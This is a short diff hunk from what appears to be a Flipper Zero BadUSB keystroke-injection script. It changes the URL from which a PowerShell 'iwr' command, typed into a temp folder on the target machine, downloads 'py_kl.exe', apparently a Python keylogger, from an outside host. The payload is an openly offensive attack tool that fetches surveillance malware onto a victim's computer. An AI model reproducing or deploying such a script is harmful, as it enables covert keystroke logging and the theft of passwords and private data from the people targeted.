@@ -21,7 +21,7 @@ STRING cd $env:TEMP; mkdir Temp; cd Temp
 ENTER
 DELAY 500
 
-STRING iwr -Uri "https://exnet.space/media/files/public/other/scripts/py_kl.exe" -OutFile "py_kl.exe"
+STRING iwr -Uri "https://github.com/Exclavia/flipper-stuff/raw/refs/heads/main/badusb/Python_Keylogger/build/py_kl.exe" -OutFile "py_kl.exe"
 ENTER
 DELAY 2000
 
